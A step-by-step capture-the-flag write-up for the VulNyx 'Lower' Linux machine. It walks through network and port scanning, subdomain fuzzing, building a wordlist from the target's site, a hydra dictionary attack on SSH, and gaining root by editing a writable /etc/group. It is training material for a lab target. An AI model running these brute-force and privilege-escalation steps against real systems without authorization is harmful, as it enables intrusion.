# Lower

## Table of Contents

- [Lower](#lower)
  - [Table of Contents](#table-of-contents)
  - [Challenge Information](#challenge-information)
  - [Solution Information](#solution-information)
  - [Step-by-step Solution](#step-by-step-solution)
    - [Phase 001: Self-Awareness](#phase-001-self-awareness)
      - [Step 001: Determine Current User Identity](#step-001-determine-current-user-identity)
      - [Step 002: Identify the Hostname](#step-002-identify-the-hostname)
      - [Step 003: Understand Network Configurations](#step-003-understand-network-configurations)
    - [Phase 002: Information Gathering](#phase-002-information-gathering)
      - [Step 004: Conduct a Local Network Scan](#step-004-conduct-a-local-network-scan)
      - [Step 005: Perform a Comprehensive Port Scan](#step-005-perform-a-comprehensive-port-scan)
      - [Step 006: Inspect HTTP Responses](#step-006-inspect-http-responses)
      - [Step 007: Prepare a Wordlist for Subdomain Enumeration](#step-007-prepare-a-wordlist-for-subdomain-enumeration)
      - [Step 008: Configure Hosts File for Domain Resolution](#step-008-configure-hosts-file-for-domain-resolution)
      - [Step 009: Enumerate Subdomains for the Domain](#step-009-enumerate-subdomains-for-the-domain)
      - [Step 010: Update Hosts File with the New Subdomain](#step-010-update-hosts-file-with-the-new-subdomain)
      - [Step 011: Explore the Subdomain Content](#step-011-explore-the-subdomain-content)
    - [Phase 003: Focusing on People](#phase-003-focusing-on-people)
      - [Step 012: Gather Information on Individuals](#step-012-gather-information-on-individuals)
      - [Step 013: Create a Username List](#step-013-create-a-username-list)
      - [Step 014: Explore Password Acquisition Methods](#step-014-explore-password-acquisition-methods)
    - [Phase 004: Run an Attack](#phase-004-run-an-attack)
      - [Step 015: Perform a Dictionary Attack](#step-015-perform-a-dictionary-attack)
      - [Step 016: Jump through networks](#step-016-jump-through-networks)
    - [Phase 005: Capture the User Flag](#phase-005-capture-the-user-flag)
      - [Step 017: Discover the User Flag](#step-017-discover-the-user-flag)
    - [Phase 006: Privilege Escalation](#phase-006-privilege-escalation)
      - [Step 018: Copy File over SSH](#step-018-copy-file-over-ssh)
      - [Step 019: Run a Script](#step-019-run-a-script)
      - [Step 020: Exploit Misconfigured Write Access](#step-020-exploit-misconfigured-write-access)
      - [Step 021: Terminate SSH Session](#step-021-terminate-ssh-session)
      - [Step 022: Reconnect](#step-022-reconnect)
      - [Step 023: Escalate privileges](#step-023-escalate-privileges)
    - [Phase 007: Capture the Root Flag](#phase-007-capture-the-root-flag)
      - [Step 024: Discover the Root Flag](#step-024-discover-the-root-flag)

## Challenge Information

- Competition: VulNyx
- Challenge: Lower
- Target OS: Linux
- Difficulty: Very Easy
- Goal: Capture the flag of the user and the root user (Two flags).
- Creator: d4t4s3c
- Release: 2024-12-15

## Solution Information

- Author: TheHexPhoenix
- Attacker OS: Kali Linux
- Used tools: nmap, ffuf, cewl, linpeas, hydra, seclists
- Written in: 2025-10-30
- Modified by: -
- Last Modified: -

## Step-by-step Solution

### Phase 001: Self-Awareness

#### Step 001: Determine Current User Identity

1. **Purpose:** It is essential to identify the user currently in use.
2. **Access:** `user`
3. **Command:**

    ```bash
    whoami
    ```

4. **Explanation:** The command `whoami` displays the effective username of the active session.
5. **Result:**

    ```bash
    TheHexPhoenix
    ```

6. **Analysis:** The current user is identified as `TheHexPhoenix`.

#### Step 002: Identify the Hostname

1. **Purpose:** Knowing the hostname of the machine is crucial for context in networking and security tasks.
2. **Access:** `user`
3. **Command:**

    ```bash
    hostname
    ```

4. **Explanation:** The command `hostname` displays the system's hostname.
5. **Result:**

    ```bash
    kali
    ```

6. **Analysis:** The host is recognized as `kali`.

#### Step 003: Understand Network Configurations

1. **Purpose:** Understanding the network interfaces and IP configuration of the attacker's machine is vital for network-related tasks.
2. **Access:** `user`
3. **Command:**

    ```bash
    ip a
    ```

4. **Explanation:** The `ip` command aids in displaying or manipulating network settings. Using the `a` option presents all objects in the output.
5. **Result:**

    ```bash
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
        valid_lft forever preferred_lft forever
        inet6 ::1/128 scope host noprefixroute 
        valid_lft forever preferred_lft forever
    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
        link/ether 08:00:27:1f:b7:23 brd ff:ff:ff:ff:ff:ff
    3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
        link/ether 08:00:27:9a:7c:f9 brd ff:ff:ff:ff:ff:ff
        inet 192.168.250.100/24 scope global eth1
        valid_lft forever preferred_lft forever
    ```

6. **Analysis:** The output reveals two primary network interfaces, with `eth1` assigned the IP address `192.168.250.100`, belonging to the `192.168.250.0/24` nerwork.

### Phase 002: Information Gathering

#### Step 004: Conduct a Local Network Scan

1. **Purpose:** Discover active hosts on the local network and identify potential targets.
2. **Access:** `user`
3. **Command:**

    ```bash
    nmap -sn 192.168.250.0/24
    ```

4. **Explanation:** The tool `nmap` serves for network scanning, while the `-sn` flag performs a ping scan to identify live hosts without conducting a full port scan.
5. **Result:**

    ```bash
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-30 17:37 EDT
    Nmap scan report for 192.168.250.101
    Host is up (0.00024s latency).
    MAC Address: 08:00:27:27:F2:57 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
    Nmap scan report for 192.168.250.100
    Host is up.
    Nmap done: 256 IP addresses (2 hosts up) scanned in 4.17 seconds
    ```

6. **Analysis:** The scan reveals two active hosts; our attacker machine is `192.168.250.100`, so the target identified as `192.168.250.101`.

#### Step 005: Perform a Comprehensive Port Scan

1. **Purpose:** Identify open ports, running services, and gather version information on the target.
2. **Access:** `root`
3. **Command:**

    ```bash
    sudo nmap -Pn -p- -A 192.168.250.101
    ```

4. **Explanation:** The `-Pn` option bypasses host discovery, while the `-p-` flag scans all 65,536 ports. The `-A` option activates OS detection, version detection, script scanning, and traceroute functions.
5. **Result:**

    ```bash
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-30 01:38 EDT
    Nmap scan report for 192.168.250.101
    Host is up (0.00036s latency).
    Not shown: 65533 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
    | ssh-hostkey: 
    |   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
    |_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
    80/tcp open  http    Apache httpd 2.4.62 ((Debian))
    |_http-title: Did not follow redirect to http://www.unique.nyx
    |_http-server-header: Apache/2.4.62 (Debian)
    MAC Address: 08:00:27:27:F2:57 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
    Device type: general purpose|router
    Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
    OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
    OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    TRACEROUTE
    HOP RTT     ADDRESS
    1   0.36 ms 192.168.250.101

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 11.92 seconds
    ```

6. **Analysis:** The target system, recognized as a Linux machine, which has two open TCP ports: `22` (OpenSSH) and `80` (Apache httpd).

#### Step 006: Inspect HTTP Responses

1. **Purpose:** Analyze the web server's response from port 80.
2. **Access:** `user`
3. **Command:**

    ```bash
    curl -v 192.168.250.101:80
    ```

4. **Explanation:** The `curl` tool facilitates data transmission between the client and server. Using the `-v` (verbose) flag yields detailed transfer information. We request the root page from the target machine at port 80.
5. **Result:**

    ```bash
    *   Trying 192.168.250.101:80...
    * Connected to 192.168.250.101 (192.168.250.101) port 80
    * using HTTP/1.x
    > GET / HTTP/1.1
    > Host: 192.168.250.101
    > User-Agent: curl/8.15.0
    > Accept: */*
    > 
    * Request completely sent off
    < HTTP/1.1 302 Found
    < Date: Thu, 30 Oct 2025 21:43:33 GMT
    < Server: Apache/2.4.62 (Debian)
    < Location: http://www.unique.nyx
    < Content-Length: 0
    < Content-Type: text/html; charset=UTF-8
    < 
    * Connection #0 to host 192.168.250.101 left intact
    ```

6. **Analysis:** The server returns an HTTP 302 redirect to `http://www.unique.nyx`.

#### Step 007: Prepare a Wordlist for Subdomain Enumeration

1. **Purpose:** Gather potential subdomain names necessary for further reconnaissance.
2. **Access:** `root`
3. **Command:**

    ```bash
    sudo apt update && sudo apt install -y seclists
    ```

4. **Explanation:** The `seclists` package contains various useful wordlists and must be installed. The command `apt update` refreshes package lists while `apt install -y seclists` installs the package. The `-y` flag is used to automatically affirming prompts during the installation process.
5. **Result:** The installation process.
6. **Analysis:** The `seclists` package is successfully installed, providing access to multiple wordlists.

#### Step 008: Configure Hosts File for Domain Resolution

1. **Purpose:** Map the domain name to the target IP address.
2. **Access:** `root`
3. **Command:**

    ```bash
    sudo nano /etc/hosts
    ```

4. **Change:** append the line `192.168.250.101 unique.nyx` at the end of the file.
5. **Explanation:** A text editor (e.g., nano or vim) is used to edit the `/etc/hosts` file and assigning the domain `unique.nyx` to the IP address `192.168.250.101`.
6. **Analysis:** Future requests for `unique.nyx` are now directed to the IP address `192.168.250.101`.

#### Step 009: Enumerate Subdomains for the Domain

1. **Purpose:** Discover existing subdomains associated with `unique.nyx`.
2. **Access:** `user`
3. **Command:**

    ```bash
    ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:SUBDOMAIN -H "Host: SUBDOMAIN.unique.nyx" -u http://unique.nyx -fw 1
    ```

4. **Explanation:** The `ffuf` tool performs fuzzing searches on web applications to find hidden files and directories. The `-w` option specifies a wordlist from `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt` file, using its values in the search via the `SUBDOMAIN` keyword. The `-H` option is employed to set a header named `Host` with the value of `SUBDOMAIN.unique.nyx`, while the `-u` option defines the target URL as `http://unique.nyx`. The `-fw 1` flag indicates that results with one word in the response should be shown.
5. **Result:**

    ```bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

        v2.1.0-dev
    ________________________________________________

    :: Method           : GET
    :: URL              : http://unique.nyx
    :: Wordlist         : SUBDOMAIN: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
    :: Header           : Host: SUBDOMAIN.unique.nyx
    :: Follow redirects : false
    :: Calibration      : false
    :: Timeout          : 10
    :: Threads          : 40
    :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
    :: Filter           : Response words: 1
    ________________________________________________

    tech                    [Status: 200, Size: 19766, Words: 4127, Lines: 453, Duration: 2ms]
    :: Progress: [4989/4989] :: Job [1/1] :: 50 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
    ```

6. **Analysis:** The scan uncovers a subdomain named `tech`.

#### Step 010: Update Hosts File with the New Subdomain

1. **Purpose:** Ensure the newly discovered subdomain is resolvable.
2. **Access:** `root`
3. **Command:**

    ```bash
    sudo nano /etc/hosts
    ```

4. **Change:** Modify the existing line `192.168.250.101 unique.nyx` to `192.168.250.101 unique.nyx tech.unique.nyx`.
5. **Explanation:** The existing entry in `/etc/hosts` is modified to include `tech.unique.nyx` too, allowing it to map to the target's IP address.
6. **Analysis:** Requests for `tech.unique.nyx` now route to `192.168.250.101`.

#### Step 011: Explore the Subdomain Content

1. **Purpose:** Ascertain what content the subdomain serves.
2. **Access:** `user`
3. **Command:** Open a web browser and enter `tech.unique.nyx` as the URL.
4. **Explanation:** A web browser is used to visit `tech.unique.nyx`.
5. **Result:**

    ![alt text](screenshot/screenshot_001.png)

6. **Analysis:** The subdomain presents a web page associated with a company named `unique`.

### Phase 003: Focusing on People

#### Step 012: Gather Information on Individuals

1. **Purpose:** Locate individual names on the webpage, as usernames often correlate with personal names.
2. **Access:** `user`
3. **Command:** Search the webpage.
4. **Explanation:** Understanding user identities assists in login authentication attempts.
5. **Result:**

    ![alt text](screenshot/screenshot_002.png)

6. **Analysis:** The page reveals three individuals: `Tom`, `Kathren`, and `Lancer`.

#### Step 013: Create a Username List

1. **Purpose:** Compile a file for potential usernames to facilitate future credential guessing attacks.
2. **Access:** `user`
3. **Command:**

    ```bash
    echo "Tom\ntom\nLancer\nlancer\nKathren\nkathren" > names.txt
    ```

4. **Explanation:** This command is issued to create a file named `names.txt`, which includes both capitalized and lowercase versions of the discovered names, considering that usernames are often case-sensitive.
5. **Result:** The command has no output.
6. **Analysis:** A file containing potential usernames has been created.

#### Step 014: Explore Password Acquisition Methods

1. **Purpose:** Evaluate various strategies for obtaining passwords. While brute-force tactics can be employed, they may not be necessary in Capture The Flag (CTF) challenges, as those often provide hints or relevant information. In many CTF scenarios, critical clues related to authentication are embedded within the challenge context.
2. **Access:** `user`
3. **Command:**

    ```bash
    cewl http://tech.unique.nyx --with-numbers -w words.txt
    ```

4. **Explanation:** The tool `cewl` serves as a custom wordlist generator that spiders a specified URL. Utilizing the `--with-numbers` option enables the inclusion of words containing numbers, while the `-w` flag designates `words.txt` as the output file.
5. **Result:**

    ```bash
    CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
    ```

6. **Analysis:** A custom wordlist named `words.txt` has been successfully generated from the content of the target website.

### Phase 004: Run an Attack

#### Step 015: Perform a Dictionary Attack

1. **Purpose:** Perform a dictionary attack against the SSH service using the generated username and password lists.
2. **Access:** `user`
3. **Command:**

    ```bash
    hydra -FI -L names.txt -P words.txt 192.168.250.101 ssh
    ```

4. **Explanation:** The tool `hydra` is utilized to crack login credentials across various services. The `-F` option commands `hydra` to terminate immediately upon discovering the first valid username and password pair on any host. The `-I` flag instructs `hydra` to ignore the existence of the restore file, thereby conserving run time. These options can be combined as `-FI` to further streamline efficiency. The `-L` option specifies the `names.txt` file as the username list, while the `-P` option points to the `words.txt` file for passwords. Finally, the target and service to be attacked are clearly defined.
5. **Result:**

    ```bash
    Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-30 19:38:46
    [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
    [WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
    [DATA] max 16 tasks per 1 server, overall 16 tasks, 1284 login tries (l:6/p:214), ~81 tries per task
    [DATA] attacking ssh://192.168.250.101:22/
    [STATUS] 236.00 tries/min, 236 tries in 00:01h, 1054 to do in 00:05h, 10 active
    [STATUS] 196.00 tries/min, 588 tries in 00:03h, 702 to do in 00:04h, 10 active
    [22][ssh] host: 192.168.250.101   login: lancer   password: *******
    [STATUS] attack finished for 192.168.250.101 (valid pair found)
    1 of 1 target successfully completed, 1 valid password found
    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-30 19:42:44
    ```

6. **Analysis:** The credentials for the user `lancer` have been successfully discovered.

#### Step 016: Jump through networks

1. **Purpose:** Utilize the discovered credentials to establish an SSH connection to the target machine.
2. **Access:** `user`
3. **Command:**

    ```bash
    ssh lancer@192.168.250.101
    ```

4. **Explanation:** This command initiates an SSH connection to the target IP as the user `lancer`, system will prompt for the associated password.
5. **Result:** The command has no output.
6. **Analysis:** A successful SSH session has been established on the target machine as the user `lancer`.

### Phase 005: Capture the User Flag

#### Step 017: Discover the User Flag

1. **Purpose:** Locate and display the contents of the user flag file.
2. **Access:** `user`
3. **Command:**

    ```bash
    cat user.txt
    ```

4. **Explanation:** The `user.txt` file is conventionally found in the user's home directory. The `cat` command is employed to display its contents.

5. **Result:**

    ```bash
    bbb44**********************c540c
    ```

6. **Analysis:** This is the user flag (with part of the flag omitted).

### Phase 006: Privilege Escalation

#### Step 018: Copy File over SSH

1. **Purpose:** It is evident that the user `lancer` has no access to execute the `sudo` command. To identify potential privilege escalation vectors, the `linpeas.sh` script will be utilized. Initially, the script must be transferred to the target machine.
2. **Access:** `user`
3. **Command:**

    ```bash
    scp TheHexPhoenix@192.168.250.100:/usr/share/peass/linpeas/linpeas.sh .
    ```

4. **Explanation:** `scp` (secure copy) is leveraged to transfer the `linpeas.sh` script from the attacker's machine to the current directory (`.`) on the target machine. The source is specified as `TheHexPhoenix@192.168.250.100:/usr/share/peass/linpeas/linpeas.sh`, while the destination is the current directory (`.`).
5. **Result:**

    ```bash
    linpeas.sh                 100%  949KB  75.4MB/s   00:00
    ```

6. **Analysis:** The `linpeas.sh` script has been successfully transferred to the target machine.

#### Step 019: Run a Script

1. **Purpose:** Execute the `linpeas.sh` script to search for possible privilege escalation vectors.
2. **Access:** `user`
3. **Command:**

    ```bash
    ./linpeas.sh
    ```

4. **Explanation:** The script is executed from the current directory, as it is likely not located in a standard system path. This will generate a substantial amount of output detailing the system's configuration and identifying potential vulnerabilities.
5. **Result:**

    ```bash
    ...
    ╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
    ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                 
    /dev/mqueue
    /dev/shm
    /etc/group
    /home/lancer
    /run/lock
    /run/user/1000
    /run/user/1000/dbus-1
    /run/user/1000/dbus-1/services
    ...
    ```

6. **Analysis:** The `linpeas` script has identified that `lancer` possesses write access to the `/etc/group` file.

#### Step 020: Exploit Misconfigured Write Access

1. **Purpose:** Exploit the write permissions on `/etc/group` to add the `lancer` user to the `sudo` group.
2. **Access:** `user`
3. **Command:**

    ```bash
    nano /etc/group
    ```

4. **Change:** Modify the line `sudo:x:<number>:` to `sudo:x:<number>:lancer`.
5. **Explanation:** By editing the `/etc/group` file, the `lancer` user is integrated into the `sudo` group, thereby granting them sudo privileges.
6. **Analysis:** The user `lancer` has been successfully added to the `sudo` group.

#### Step 021: Terminate SSH Session

1. **Purpose:** Terminate the SSH session.
2. **Access:** `user`
3. **Command:**

    ```bash
    exit
    ```

4. **Explanation:** The `exit` command is employed to terminate the current shell session.
5. **Result:**

    ```bash
    cerrar sesión
    Connection to 192.168.250.101 closed.
    ```

6. **Analysis:** The SSH session has been successfully terminated.

#### Step 022: Reconnect

1. **Purpose:** Re-establish the SSH session to apply the modified configurations.
2. **Access:** `user`
3. **Command:**

    ```bash
    ssh lancer@192.168.250.101
    ```

4. **Explanation:** A new SSH session is initiated.
5. **Result:** The command has no output.
6. **Analysis:** A new SSH session as the user `lancer` has been successfully established.

#### Step 023: Escalate privileges

1. **Purpose:** Escalate privileges to the `root` user.
2. **Access:** `user`
3. **Command:**

    ```bash
    sudo su
    ```

4. **Explanation:** With the `lancer` user now a member of the `sudo` group, the command `sudo su` can be executed to open a new shell as the `root` user.
5. **Result:**

    ```bash
    ```

6. **Analysis:** Privileges have been successfully escalated to the `root` user, as indicated by the change in the shell prompt.

### Phase 007: Capture the Root Flag

#### Step 024: Discover the Root Flag

1. **Purpose:** Locate and display the contents of the root flag file.
2. **Access:** `root`
3. **Command:**

    ```bash
    cat root.txt
    ```

4. **Explanation:** The root flag is typically housed within the `root.txt` file located in the `/root` directory, which serves as the home directory for the root user.
5. **Result:**

    ```bash
    b2daf**********************b61b4
    ```

6. **Analysis:** This is the root flag (with part of the flag omitted).
